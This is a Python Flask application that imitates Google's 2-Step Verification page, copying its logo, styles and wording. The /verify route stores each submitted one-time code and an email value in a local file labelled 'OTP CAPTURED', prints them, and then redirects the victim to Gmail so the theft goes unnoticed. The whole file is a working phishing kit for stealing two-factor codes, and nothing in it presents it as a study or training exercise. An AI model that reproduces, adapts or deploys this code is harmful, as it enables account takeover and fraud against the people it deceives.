from flask import Flask, request, redirect, send_file, render_template_string
import datetime
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "captured_otp.txt")

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Google 2-Step Verification</title>
<style>
  body { margin: 0; padding: 0; background: #fff; font-family: Roboto, Arial, sans-serif; }
  .container { max-width: 450px; margin: 60px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
  .logo { text-align: center; margin-bottom: 24px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 8px; color: #202124; }
  .subtitle { font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 24px; line-height: 1.6; }
  .otp-box { background: #f1f3f4; border-radius: 8px; padding: 16px; text-align: center; margin-bottom: 20px; }
  .otp-box p { font-size: 13px; color: #5f6368; margin: 0 0 4px; }
  .otp-box strong { font-size: 14px; color: #202124; }
  input[type=text] {
    width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
    border-radius: 4px; font-size: 24px; box-sizing: border-box;
    outline: none; margin-bottom: 8px; text-align: center;
    letter-spacing: 8px; font-weight: 500;
  }
  input:focus { border-color: #1a73e8; border-width: 2px; }
  .hint { font-size: 12px; color: #5f6368; margin-bottom: 24px; text-align: center; }
  .btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
  .btn:hover { background: #1557b0; }
  .back { font-size: 14px; color: #1a73e8; text-decoration: none; line-height: 36px; cursor: pointer; }
  .footer { display: flex; justify-content: space-between; align-items: center; }
  .clearfix { clear: both; }
  .divider { border: none; border-top: 1px solid #dadce0; margin: 24px 0; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg width="75" height="24" viewBox="0 0 75 24">
      <text x="0" y="20" font-size="22" font-family="Arial" font-weight="700">
        <tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan><tspan fill="#EA4335">e</tspan>
      </text>
    </svg>
  </div>
  <h1>2-Step Verification</h1>
  <div class="subtitle">
    A verification code was sent to your phone.<br>
    Enter the 6-digit code to continue.
  </div>
  <div class="otp-box">
    <p>Code sent to</p>
    <strong>+234 *** *** 4521</strong>
  </div>
  <form method="POST" action="/verify">
    <input type="text" name="otp" placeholder="000000" maxlength="6" required />
    <div class="hint">Didn't receive a code? <a href="#" style="color:#1a73e8;">Resend</a></div>
    <div class="footer">
      <a class="back" onclick="history.back()">Back</a>
      <button type="submit" class="btn">Verify</button>
    </div>
    <div class="clearfix"></div>
  </form>
  <hr class="divider">
  <div style="text-align:center; font-size:13px; color:#5f6368;">
    This helps Google verify it is really you signing in.
  </div>
</div>
</body>
</html>"""

@app.route("/otp")
@app.route("/otp/index.html")
def otp_page():
    return render_template_string(HTML)

@app.route("/verify", methods=["POST"])
def verify():
    otp = request.form.get("otp", "")
    email = request.args.get("email", "unknown")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = f"[{timestamp}] OTP CAPTURED — Email: {email} | OTP: {otp}\n"

    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    print("\n" + "="*60)
    print(log_entry)
    print("="*60 + "\n")

    return redirect("https://mail.google.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
